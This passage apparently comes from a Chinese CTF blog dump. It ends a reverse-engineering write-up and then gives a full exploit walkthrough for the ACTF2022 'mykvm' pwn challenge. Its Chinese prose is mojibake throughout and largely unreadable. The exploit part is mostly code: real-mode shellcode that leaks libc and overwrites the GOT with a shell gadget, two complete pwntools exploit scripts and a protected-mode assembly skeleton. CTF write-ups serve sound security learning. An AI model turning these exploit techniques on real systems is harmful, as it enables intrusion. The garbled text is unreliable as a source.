ä¸Šinit_arrayä¸­æœ‰ä¸€ä¸ªå¥‡æ€ªçš„è®¡ç®—å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ¨æ€è°ƒè¯•æ¥çœ‹çœ‹v3è¿™ä¸ªä½ç½®çš„å®é™…æƒ…å†µã€‚è°ƒè¯•ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œv3çš„åˆå§‹å€¼æ˜¯0.00048291080524950886ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬ä¹‹å‰åˆ†æçš„0.2021ã€‚\n\n![actaul_v3](20220707181436.png?size=600)\n\n\n\n## pythonï¼š16è¿›åˆ¶ä¸double/floatä¹‹é—´çš„è½¬æ¢\n\n[Python åå…­è¿›åˆ¶ä¸æµ®ç‚¹æ•°äº’ç›¸è½¬æ¢](https://blog.csdn.net/lwaif/article/details/53335191)\n\n[pythonä¸­struct.pack()å‡½æ•°å’Œstruct.unpack()å‡½æ•°](https://www.cnblogs.com/litaozijin/p/6506354.html)\n\nè½¬æ¢ç¤ºä¾‹ä»£ç \n\n```python\nimport struct\n\nnum_hex = 0x3f19ad3fbd59ca39\nnum_double = 0.00009794904266317233\n\n# hex to double\nnum_hex_str = '{:x}'.format(num_hex)    # å°†æ•°è½¬æˆhex string - '3f19ad3fbd59ca39'\nresult_double = struct.unpack('>d',bytes.fromhex(num_hex_str))[0]       # å°†hex stringè½¬æˆdoubleå‹æ•° \nprint(\"double is : {}\".format(result_double))\n\n# double to hex\nresult_hex_str = struct.pack(\">d\",num_double).hex()   # å°†doubleè½¬æˆhex string\nresult_int = int(result_hex_str,16)       # hex stringè½¬æˆæ•°\nprint(\"hex is : 0x{:x}\".format(result_int))\n```\n\n\n\n\n## sympyåº“ï¼šè§£æ•°å­¦æ–¹ç¨‹\n\n[rMath-æµ®ç‚¹è¿ç®—çš„é€†å‘åˆ†æ](http://spd.dropsec.xyz/2017/03/30/rMath-%E6%B5%AE%E7%82%B9%E8%BF%90%E7%AE%97%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/)\n\nä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾è¦è®¡ç®—ä»¥ä¸‹å¼å­ä¸­xçš„å€¼ï¼š\n\n```\n2.718281828459045 - x*0.00048291080524950886 = 0.00009794904266317233\n```\n\né‚£ä¹ˆå¯ä»¥åˆ©ç”¨å¦‚ä¸‹è„šæœ¬\n\n```python\nimport struct\nfrom sympy import *\n\nStr = symbols('Str')\n\njie = solve(2.718281828459045 - Str*0.00048291080524950886 - 0.00009794904266317233,Str)\n\nret = struct.pack(\">f\",jie[0]).hex()\n\nprint(ret)\n```\n\n\nIDAä½¿ç”¨å°æŠ€å·§â€”â€”å°†æ•°æ®è½¬æ¢æˆdoubleç±»å‹çš„æ“ä½œï¼š\n\n![ida_to_double](20220707175957.png?size=600)\n\n\n\n\n# simulator\n\né™„ä»¶ï¼š[simulator.zip](simulator.zip)\n\n\n\n\n\n# GoodRE\n\né™„ä»¶ï¼š[GoodRE.zip](GoodRE.zip)\n\n\n\n\n\n# SimpleFileSytem\n\né™„ä»¶ï¼š[SimpleFileSystem.zip](SimpleFileSystem.zip)\n\n\n\n# SoMuchCode\n\né™„ä»¶ï¼š[SoMuchCode.zip](SoMuchCode.zip)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["reverse"],"categories":["CTF"]},{"title":"ACTF2022 pwn mykvmé¢˜è§£","url":"/2022/07/01/ACTF2022-pwn-mykvm/","content":"\n\n\n- é¢˜ç›®æè¿°ï¼šKVM is funny, enjoy it!\n- é¢˜ç›®é™„ä»¶ï¼š[mykvm.zip](mykvm.zip)\n\n# åˆ†æ\n\nå…ˆçœ‹ä¸€ä¸‹mainå‡½æ•°ä¸­çš„ä»£ç é€»è¾‘ï¼Œ\n\n```c\n   puts(\"your code size: \");\t\t\t//å¾…è¾“å…¥codeçš„å¤§å°\n    __isoc99_scanf(\"%d\", nbytes);\n    if ( nbytes[0] <= 0x1000 )\n    {\n      puts(\"your code: \");\t\t\t//è¾“å…¥å‡†å¤‡å¥½çš„codeï¼Œå°†åœ¨kvmè™šæ‹Ÿæœºä¸­è¿è¡Œ\n      read(0, buf, nbytes[0]);\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"guest name: \");\t\t\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"guest passwd: \");\t\n      sub_400B92(buf, nbytes[0]);\t\t\t//å‡½æ•°å†…éƒ¨é€šè¿‡ioctlè°ƒç”¨å®ç°kvmè™šæ‹Ÿæœºæ‰§è¡Œä¸Šé¢è¾“å…¥çš„codeå¹¶è¿”å›\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"host name: \");\t\t\n      memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);\t\n      puts(\"Bye!\");\n```\n\nåšé¢˜ä¹‹å‰å¹¶æ²¡æœ‰ç ”ç©¶è¿‡KVMçš„æœºåˆ¶ï¼Œäºæ˜¯æœäº†ä¸€ä¸‹è·Ÿkvmç›¸å…³çš„ctfé¢˜ï¼Œå‘ç°äº†è¿™ä¸€ç¯‡ï¼š[Confidence2020 CTF KVM](https://www.anquanke.com/post/id/254790)ã€‚æŒ‰ç…§è¿™ä¸ªé¢˜ç›®ä¸­çš„æ¼æ´ç‚¹ï¼Œå¾ˆå¿«åœ¨mykvmä¸­ä¹Ÿæ‰¾åˆ°äº†ç±»ä¼¼æ¼æ´ã€‚å¦‚ä¸‹ï¼Œsub_400B92()å‡½æ•°ä¸­memory_sizeçš„å€¼è®¾ç½®çš„ç›¸å½“å¤§ï¼Œäºæ˜¯æˆ‘ä»¬èƒ½åœ¨kvmè™šæ‹Ÿæœºä¸­è¶Šç•Œè®¿é—®åˆ°hostæœºçš„å†…å­˜ã€‚\n\n```c\n  v8.slot = 0;\n  v8.flags = 0;\n  v8.guest_phys_addr = 0LL;\n  v8.memory_size = 0x40000000LL;\n  v8.userspace_addr = (int)((_DWORD)&unk_602100\n                          - (((((unsigned int)((int)&unk_602100 >> 31) >> 20) + (unsigned __int16)&unk_602100) & 0xFFF)\n                           - ((unsigned int)((int)&unk_602100 >> 31) >> 20))\n                          + 4096);\n  ioctl(v4, 0x4020AE46uLL, &v8);\n```\n\nä¸è¿‡ï¼Œunk_602100åœ¨bssæ®µï¼Œåœ¨kvmè™šæ‹Ÿæœºä¸­æˆ‘ä»¬åªèƒ½å¾€åè®¿é—®ï¼Œå³å¯èƒ½è®¿é—®åˆ°hostè¿›ç¨‹çš„å †ç©ºé—´ã€‚åŒæ—¶ï¼Œè¯¥é¢˜å¯¹kvmè™šæ‹Ÿæœºçš„è®¾ç½®ï¼Œè¦æ±‚æˆ‘ä»¬çš„ä»£ç ä»å®æ¨¡å¼å¼€å§‹è¿è¡Œã€‚å› æ­¤ï¼Œè¦ä¹ˆæˆ‘ä»¬åœ¨å®æ¨¡å¼æœ‰é™çš„è®¿å­˜ç©ºé—´ï¼ˆ1Mï¼‰ä¸‹è¿›è¡Œåˆ©ç”¨ï¼Œè¦ä¹ˆæƒ³åŠæ³•è¿›å…¥ä¿æŠ¤æ¨¡å¼è¿›è¡Œåˆ©ç”¨ã€‚\n\nç”±äºå¯¹å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼çš„åˆ‡æ¢ä»¥åŠé¡µè¡¨çš„è®¾ç½®ä¸ç†Ÿï¼Œä¸”å †çš„åœ°å€èŒƒå›´åœ¨ä¸€å®šæ¦‚ç‡ä¸‹ä¼šè·Ÿkvmèƒ½è®¿é—®çš„ç©ºé—´ï¼ˆ1Mï¼‰æœ‰é‡åˆï¼Œäºæ˜¯æˆ‘ä»¬å°±ç›´æ¥åœ¨å®æ¨¡å¼ä¸‹å®Œæˆäº†å¯¹è¯¥é¢˜çš„åˆ©ç”¨ã€‚\n\n\n\n## è¶Šç•Œèƒ½åšä»€ä¹ˆï¼Ÿ\n\né¦–å…ˆï¼Œåœ¨bssæ®µçš„æœ€åï¼Œæœ‰ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œæ˜¯`memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);`çš„ç›®çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½å†™hostè¿›ç¨‹ç©ºé—´çš„ä»»æ„åœ°å€ï¼Œé•¿åº¦ä¸º0x20ã€‚\n\n```\n.bss:0000000000602100 unk_602100      db    ? ;               ; DATA XREF: sub_400B92+8Câ†‘o\n.bss:0000000000602100                                         ; sub_400B92+93â†‘o\n.bss:0000000000602101                 db    ? ;\n.bss:0000000000602102                 db    ? ;\n.bss:0000000000602103                 db    ? ;\n.bss:0000000000602104                 db    ? ;\n.............\n.bss:000000000060A100 ; void *dest\n.bss:000000000060A100 dest            dq ?                    ; DATA XREF: main+7Eâ†‘w\n.bss:000000000060A100                                         ; main+85â†‘r ...\n.bss:000000000060A100 _bss            ends\n```\n\nç„¶åï¼Œå†å¾€åå†™å°±æ˜¯hostè¿›ç¨‹çš„å †ç©ºé—´äº†ï¼Œè¿™éƒ¨åˆ†éœ€è¦åŠ¨æ€è°ƒè¯•æŸ¥çœ‹å…¶å†…å®¹ï¼Œæ‰¾åˆ°å¯¹æˆ‘ä»¬æœ‰ç”¨çš„éƒ¨åˆ†ã€‚\n\nï¼ˆè°ƒè¯•è¿‡ç¨‹çœç•¥ï¼Œè¯¥ç¯å¢ƒä½¿ç”¨çš„libç‰ˆæœ¬è¾ƒä½ï¼Œæ˜¯libc2.23ï¼Œå­˜åœ¨fastbinï¼‰\n\n- åœ¨å †ç©ºé—´ä¸­æœ‰ä¸€äº›libcçš„åœ°å€ï¼Œåˆ©ç”¨è¿™ä¸ªå¯ä»¥åœ¨codeä¸­è®¡ç®—libcåŸºå€ã€‚\n\n- æˆ‘å‘ç°ï¼Œå¦‚æœ\"guest name: \"ï¼Œ\"guest passwd: \"å’Œ\"host name: \"éƒ½è¾“å…¥ç›¸åŒé•¿åº¦å­—ç¬¦ä¸²\"xxxx\"æ—¶ï¼Œä¸‰è€…åˆ†é…çš„æ˜¯åŒä¸€ä¸ªchunkã€‚ä¸”chunkçš„å8ä¸ªå­—èŠ‚å­˜ç€ä¸€ä¸ªå›ºå®šçš„libcåœ°å€ã€‚\n\n\n\n## é”™ä½å†™å…¥\n\né€šè¿‡ä»¥ä¸Šåˆ†æï¼Œæˆ‘ä»¬å…·å¤‡äº†å¦‚ä¸‹èƒ½åŠ›ï¼š\n\n- ä»»æ„åœ°å€å†™ï¼ˆç›®çš„åœ°å€å¯æ§ï¼Œå†™å…¥å†…å®¹å¯æ§ï¼Œé•¿åº¦ä¸º0x20ï¼‰\n\n- å·²çŸ¥libcåŸºå€\n\næ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è¦†å†™hostè¿›ç¨‹çš„gotè¡¨ï¼Œå°†`puts(\"Bye!\")`æ‰“å°åŠ«æŒæˆæ‰§è¡Œä¸€æ®µgadgetã€‚\n\nä½†æ˜¯ï¼Œç”±äº`memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);`ä¸­nbytes[1]çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸€å®šä¼šè¢«æˆ‘ä»¬çš„è¾“å…¥è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœå°†deståœ°å€æ”¹æˆputs@gotçš„è¯ï¼Œæ— æ³•å†™æˆç›®æ ‡gadgetåœ°å€ã€‚å¹¸å¥½æˆ‘ä»¬èƒ½å†™0x20å¤§å°çš„å†…å®¹ï¼Œå› æ­¤é€šè¿‡é”™ä½å†™å…¥ï¼Œå°±èƒ½è¾¾åˆ°ç›®çš„ã€‚\n\nps. ç”±äºæ³„éœ²çš„libcåœ°å€æ˜¯ä¿å­˜åœ¨shellcodeçš„æ‰§è¡Œç¯å¢ƒä¸­çš„ï¼Œå¹¶æœªæ³„éœ²ç»™æˆ‘ä»¬ï¼Œå› æ­¤éœ€è¦åœ¨æˆ‘ä»¬çš„shellcodeä¸­å°†gadgetåœ°å€å†™åˆ°nbytes[1]å¯¹åº”çš„å †å—ä¸­ã€‚è¿™æ ·ä¹Ÿèƒ½è¾¾åˆ°hook gotè¡¨é¡¹çš„ç›®çš„ã€‚\n\n## å…¶ä»–\n\nåšé¢˜è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›è®¤ä¸ºé‡è¦çš„ç‚¹ã€‚\n\n### bufæœªåˆå§‹åŒ–\n\nmainå‡½æ•°ä¸­çš„bufæ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†`\"your code size: `\"çš„å¤§å°è®¾ç½®ä¸ºæœ€å¤§å€¼4096æ—¶ï¼Œæ ˆä¸­æ®‹ç•™æ•°æ®ä¼šè¢«å¸¦å…¥æˆ‘ä»¬è¿è¡Œçš„kvmè™šæ‹Ÿæœºå¯è®¿é—®ç©ºé—´å†…ã€‚è¿™é‡Œé¢å­˜åœ¨libcç›¸å…³çš„åœ°å€ï¼Œä¹Ÿæ˜¯æ³„éœ²libcåŸºå€çš„ä¸€ç§æ–¹æ³•ã€‚\n\n```c\n __int64 result; // rax\n  _DWORD nbytes[3]; // [rsp+4h] [rbp-101Ch] BYREF\n  char buf[4104]; // [rsp+10h] [rbp-1010h] BYREF\n  unsigned __int64 v6; // [rsp+1018h] [rbp-8h]\n.......\n    puts(\"your code size: \");\n    __isoc99_scanf(\"%d\", nbytes);\n    if ( nbytes[0] <= 0x1000 )\n    {\n      puts(\"your code: \");\n      read(0, buf, nbytes[0]);\n........\n```\n\n\n\n### readlineæ˜¯ä»€ä¹ˆ\n\nsub_400F28()è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œä¸¤æ¬¡åœ¨kvmæ‰§è¡Œä»£ç å‰ï¼Œä¸€æ¬¡åœ¨kvmæ‰§è¡Œä»£ç åã€‚è¿™ä¸ªå‡½æ•°ä¸­ä½¿ç”¨äº†readlineï¼Œå…³äºè¿™ä¸ªå‡½æ•°ï¼Œç®€å•è§£é‡Šå¦‚ä¸‹ã€‚\n\n> readline() çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè°ƒç”¨å‡½æ•°çš„æ—¶å€™ä¼šåœ¨å±å¹•ä¸Šè¾“å‡ºï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–ä¸€è¡Œè¾“å…¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªæŒ‡å‘è¾“å…¥å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œreadline ä¼šä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²åŠ¨æ€åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥ä½¿ç”¨å®Œä¹‹åéœ€è¦freeæ‰ã€‚â€”â€”æ¥è‡ª[readlineåº“çš„ç®€å•ä½¿ç”¨](https://blog.51cto.com/u_3078781/3287226)\n\n```c\nvoid *__fastcall sub_400F28(__int64 a1)\n{\n  if ( ptr )\n  {\n    free(ptr);\n    ptr = 0LL;\n  }\n  ptr = (void *)readline(a1);\n  if ( ptr && *(_BYTE *)ptr )\n    add_history((__int64)ptr);\n  return ptr;\n}\n```\n\næ‰€ä»¥è¿™é‡Œä¼šä½¿ç”¨å †ï¼Œä¸”å †çš„å¤§å°å’Œå†…å®¹ï¼Œæˆ‘ä»¬å¯æ§ã€‚\n\n\n\n# è°ƒè¯•\n\næ³¨æ„ç‚¹ï¼š\n\n- hostéœ€è¦å¼€å¯kvmæ”¯æŒ\n- docker containerå¯åŠ¨å‘½ä»¤éœ€è¦åŠ `--privileged`ï¼Œä½¿dockerä¸­èƒ½è°ƒç”¨åˆ°å¯¹åº”çš„åŠŸèƒ½\n\n```bash\ndocker container run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest\ndocker container exec -it <container-ID> /bin/bash\n# æœ¬åœ°å‘èµ·ä¸€ä¸ªè¿æ¥å¹¶åœä½ï¼ˆraw_input(), input()ï¼‰\ngdb server :1234 --attach <pid>\n# æœ¬åœ°èµ·gdbè¿æ¥ï¼ˆtarget remote :1234ï¼‰\n```\n\n\n\n# åˆ©ç”¨\n\n\n\n## shellcodeç¼–å†™\n\næ±‡ç¼–ä»£ç è¯¦ç»†è§£é‡Š\n\n```assembly\n    .code16gcc\t\t\t; æŒ‡æ˜ç¼–è¯‘çš„ç¨‹åºæ˜¯è¿è¡Œåœ¨16ä½x86å®æ¨¡å¼ä¸‹çš„\n    jmp main\t\t\t; è·³è½¬åˆ°mainå¤„å¼€å§‹è¿è¡Œ\n    .rept 40\n    .byte 0x00\n    .endr\t\t\t\t; è¿™ä¸‰æ¡æ˜¯ä¸ºäº†é€‚é…gadgetçš„æ¡ä»¶[rsp+0x30]==nullè€Œå‡†å¤‡çš„\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\t\t; ä»0x7100ï¼ˆ0x60a100ï¼‰å¤„è¯»å–destä¸­å­˜æ”¾çš„å †åœ°å€ï¼Œåˆ¤æ–­ç›®æ ‡è¯»å†™å †åœ°å€æ˜¯å¦åœ¨1Mç©ºé—´å†…\n    jb next\t\t\t\t; åœ¨1MèŒƒå›´å†…å°±è¿›å…¥nextç»§ç»­åˆ©ç”¨\n    mov ebx,0\n    div eax,ebx\t\t\t; ä¸åœ¨1MèŒƒå›´å†…åˆ™é€šè¿‡é™¤é›¶å¼‚å¸¸é‡æ–°å¼€å§‹\n\nnext:\n    mov ebx,[0x568]\t\t; ç”±äºbufæœªåˆå§‹åŒ–ï¼Œå½“é‡‡ç”¨0x1000æœ€å¤§é•¿åº¦æ‹·è´æ—¶ï¼Œå¯ä»¥å°†æ ˆä¸­çš„åœ°å€ä¿¡æ¯æ‹·è´åˆ°kvmè™šæ‹Ÿæœºå¯è®¿é—®çš„å†…å­˜ä¸­ï¼Œ0x568å¤„å­˜æ”¾äº†ä¸€ä¸ªæœ‰ç”¨åœ°å€ï¼Œé€šè¿‡åç§»å¯ä»¥å‡†ç¡®è®¡ç®—libcåŸºå€\n    add ebx,0x2270cf\n    mov [0x7200],ebx\t; libcåŸºå€çš„ä½32ä½ä¿å­˜åœ¨0x7200å¤„\n    mov ebx,[0x56c]\n    mov [0x7204],ebx   \t; libcåŸºå€çš„é«˜32ä½ä¿å­˜åœ¨0x7204å¤„\n\n    mov ebx,[0x7100]\t\n    add ebx,0x27e0\n    mov [0x7220],ebx\t; å°†ç›®æ ‡heap chunkçš„åœ°å€å­˜åˆ°0x7220å¤„\n\n    mov edx,[0x7200]\n    add edx,0x4527a\t\t\n    push edx\t\t\t; è®¡ç®—gadgetä½4å­—èŠ‚çš„å®é™…åœ°å€ï¼Œæš‚æ—¶ä¿å­˜åœ¨æ ˆä¸Š\n    add ebx,0x8\t\t\t; ç›®æ ‡heap chunkæ˜¯0x10å­—èŠ‚å¤§å°çš„ï¼Œå‰8ä¸ªå­—èŠ‚åœ¨readline()æ—¶ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨å8ä¸ªå­—èŠ‚å­˜æ”¾gadgetçš„åœ°å€\n    sub ebx,0x603000\t; æ¢ç®—æˆkvmè™šæ‹Ÿæœºä¸­å¯ä»¥è®¿é—®çš„åœ°å€\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\t\t\t; ç”±äºç›®æ ‡åœ°å€æœ‰20ä½ï¼Œè€Œx86å®æ¨¡å¼ä¸‹åœ°å€æ€»çº¿åªæœ‰16ä½ï¼Œå› æ­¤éœ€è¦å€ŸåŠ©dså¯„å­˜å™¨å®ç°è®¿å­˜æ“ä½œã€‚\n    pop edx\n    mov ds:[bx],edx\t\t; æŠŠgadgetçš„ä½4ä¸ªå­—èŠ‚æ‹·è´åˆ°äº†ç›®æ ‡å †å—å¯¹åº”ä½ç½®ï¼Œç”±äºå †å—ä¸­æ­£å¥½æœ‰libcçš„é«˜4å­—èŠ‚ä¿¡æ¯ï¼Œçœäº†ä¸€æ¬¡æ‹·è´æ“ä½œ\n\n    mov ebx,0x602020\n    mov eax,0\t\t\t; å°†dså¯„å­˜å™¨æ¸…ç©ºï¼Œå› ä¸ºæ¥ä¸‹æ¥è¦è®¿é—®çš„åœ°å€ä¸è¶…è¿‡16ä½\n    mov ds,eax\n    mov [0x7100],ebx\t; å°†destå­˜æ”¾çš„å†…å®¹æ”¹æˆgotè¡¨é¡¹ï¼ˆputcharï¼‰åœ°å€ï¼Œä»¥è¾¾åˆ°é”™ä½å°†putsçš„gotè¡¨é¡¹æ”¹æˆäº†gadgetåœ°å€çš„ç›®çš„\n\n    hlt\t\t\t\t\t; hltæŒ‡ä»¤è·Ÿé™¤é›¶å¼‚å¸¸çš„è¿”å›ä¸ä¸€æ ·ï¼Œä¾¿äºåœ¨pythonè„šæœ¬ä¸­åŒºåˆ†\n```\n\nåœ¨å†™shellcodeæ—¶ï¼Œç”±äºå¯¹x86å®æ¨¡å¼ä¸‹çš„æ±‡ç¼–è§„åˆ™ä¸ç†Ÿï¼Œé‡åˆ°äº›å‘ç‚¹ã€‚å¦‚ï¼š\n\n- eaxç”¨äºè®¿å­˜å’ŒaddæŒ‡ä»¤ç›¸å…³çš„æ“ä½œæ—¶æ— æ³•æ­£å¸¸å·¥ä½œ\n- dså¯„å­˜å™¨çš„è®¾ç½®ä¸å–æ¶ˆ\n- edxä¸­å­˜æ”¾çš„å€¼é—´éš”å‡ æ¡æŒ‡ä»¤åå¯èƒ½è¢«æ¸…é›¶ï¼Œè€Œebxä¸ä¼š\n\n\n\n## exp\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16gcc\n    jmp main\n    .byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\n    jb next\n    mov ebx,0\n    div eax,ebx\n\nnext:\n    mov ebx,[0x568]\n    add ebx,0x2270cf\n    mov [0x7200],ebx\n    mov ebx,[0x56c]\n    mov [0x7204],ebx   \n\n    mov ebx,[0x7100]\n    add ebx,0x27e0\n    mov [0x7220],ebx\t\n\n    mov edx,[0x7200]\n    add edx,0x4527a\n    mov [0x7228],edx\n    push edx\n    add ebx,0x8\n    sub ebx,0x603000\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\n    pop edx\n    mov ds:[bx],edx\n\n    mov ebx,0x602020\n    mov eax,0\n    mov ds,eax\n    mov [0x7100],ebx\n\n    hlt\n''')\n\nc = 1 \nwhile c:\n    #raw_input()    \n    io.recvuntil(\"your code size: \")\n    io.sendline('4096')\n\n    io.recvuntil(\"your code: \")\n    io.sendline(shellcode)\n\n    io.recvuntil(\"guest name: \")\n    io.sendline('bbbb')\n\n    io.recvuntil(\"guest passwd: \")\n    io.sendline('cccc')\n\n    io.recvline()\n    ret = io.recv(0x1b)\n    if \"mykvm\" not in ret:\n        c = 0\n        print(\"got it!!!\")\n        #raw_input()\n        io.sendline(\"dddd\")\n    \t# io.recvuntil(\"host name: \")\n\t\t# io.sendline('dddd')\n        break\n         \n    # except:\n    io.close()\n    io = remote(\"127.0.0.1\",8000)\n    # io = remote(\"20.247.110.192\",10888)\n\nio.interactive()\n```\n\n\n\n## ç²¾ç®€ç‰ˆexp\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16gcc\n    jmp main\n    .rept 40\n    .byte 0x00\n    .endr\t\t\t\t# ä¸ºgadget environä¸ºnullåšå‡†å¤‡\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\n    jb next\n    mov ebx,0\n    div eax,ebx      \t # æš´ç ´å‡ºèƒ½è®¿é—®çš„å †åœ°å€ï¼ˆ1Mä»¥å†…ï¼‰\n\nnext:\n    mov ebx,[0x568]\n    add ebx,0x2270cf\n\tadd ebx,0x4527a\n    push ebx\t\t\t# ä¿å­˜gadgetå®é™…åœ°å€çš„ä½4å­—èŠ‚\n\t\n    mov ebx,[0x7100]\n    add ebx,0x27e0\t\t# ç›®æ ‡heap chunkï¼Œå³memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);çš„ç¬¬äºŒä¸ªå‚æ•°\n\n\tmov ecx,0x602020\n    mov [0x7100],ecx\t# å°†memcpyç¬¬ä¸€ä¸ªå‚æ•°æ›¿æ¢æˆgotè¡¨åœ°å€\n\n    add ebx,0x8\n    sub ebx,0x603000\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\n    pop edx\n    mov ds:[bx],edx\t\t# å°†gadgetåœ°å€å†™å…¥ç›®æ ‡heap chunk\n\n    hlt\t\t\t\t\t# hltï¼ŒåŒºåˆ†div 0ï¼Œæš´ç ´\n''')\n\nc = 1 \nwhile c:\n    io.sendlineafter(\"your code size: \",'4096')\n    io.sendlineafter(\"your code: \",shellcode)\n    io.sendlineafter(\"guest name: \",'bbbb')\n    io.sendlineafter(\"guest passwd: \",'cccc')\n\n    io.recvline()\n    ret = io.recv(0x1b)\n    if \"mykvm\" not in ret:\n        c = 0\n        print(\"got it!!!\")\n        io.sendline(\"dddd\")\n        break\n      \n    io.close()\n    io = remote(\"127.0.0.1\",8000)\n    # io = remote(\"20.247.110.192\",10888)\n\nio.interactive()\n```\n\n\n\n# ç»­ï¼šè¿›å…¥å®æ¨¡å¼çš„åˆ©ç”¨\n\n[å®˜æ–¹WP](https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py)\n\nå®˜æ–¹çš„æ–¹æ³•æ˜¯é€šè¿‡è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œä½¿shellcodeèƒ½è®¿é—®åˆ°æ›´å¤šçš„å†…å­˜ï¼Œç„¶åæ³„éœ²libcåœ°å€ï¼Œæœ€åå†™gotè¡¨åŠdest(\"/bin/sh\")ï¼Œè¾¾åˆ°æ‰§è¡Œ`system(\"/bin/sh\")`çš„ç›®çš„ã€‚ï¼ˆåº”è¯¥æ˜¯å‡ºäºgadgetæœ‰environçš„é™åˆ¶ï¼Œæ‰€ä»¥æœªä½¿ç”¨gadgetç›´æ¥get shellï¼‰\n\n## ä»å®æ¨¡å¼è¿›å…¥ä¿æŠ¤æ¨¡å¼\n\nå…³äºå¦‚ä½•ä»16ä½å®æ¨¡å¼è¿›å…¥32ä½ä¿æŠ¤æ¨¡å¼ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« â€”â€” [[åŸåˆ›]16ä½å®æ¨¡å¼åˆ‡æ¢32ä½ä¿æŠ¤æ¨¡å¼è¿‡ç¨‹è¯¦è§£](https://bbs.pediy.com/thread-269223.htm).\n\n\nä»å®æ¨¡å¼è¿›å…¥32ä½ä¿æŠ¤æ¨¡å¼éœ€è¦å®Œæˆå¦‚ä¸‹å‡ ä»¶äº‹æƒ…ï¼š\n1. å±è”½ä¸­æ–­\n2. åˆå§‹åŒ–å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰\n3. å°†CR0å¯„å­˜å™¨æœ€ä½ä½ç½®1\n4. æ‰§è¡Œè¿œè·³è½¬\n5. åˆå§‹åŒ–æ®µå¯„å­˜å™¨å’Œæ ˆæŒ‡é’ˆ\n\nä»¥ä¸‹æ±‡ç¼–ä»£ç ä¾¿æ˜¯å®Œæˆä¸Šè¿°åŠŸèƒ½çš„ä¸€ä¸ªæ¡†æ¶ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚åœ¨ `; your function code` å¤„ç¼–å†™åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹è¿è¡Œçš„ä»£ç ã€‚\n\n```assembly\norg 0 \ncli                     \n\nlgdt [gdt_descriptor]   \n\nmov eax, cr0\nor eax, 0x1\nmov cr0, eax\njmp 08h:PModeMain\n \n[bits 32]\nPModeMain:\n    mov ax, 0x10       \n    mov ds, ax         \n    mov es, ax\n    mov fs, ax         \n    mov gs, ax\n    mov ax, 0x18      \n    mov ss, ax\n    mov ebp, 0x7c00    \n    mov esp, ebp\n\n                                ; your function code \n    \n    hlt\n\ngdt_start:\ngdt_null:\n    dd 0\n    dd 0\ngdt_code:\n    dw 0xffff ; Limit (bits 0-15)\n    dw 0x0 ; Base (bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10011010b ; Access Byte\n    db 11001111b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_data:\n    dw 0xffff ; Limit (bits 0-15)\n    dw 0x0 ; Base 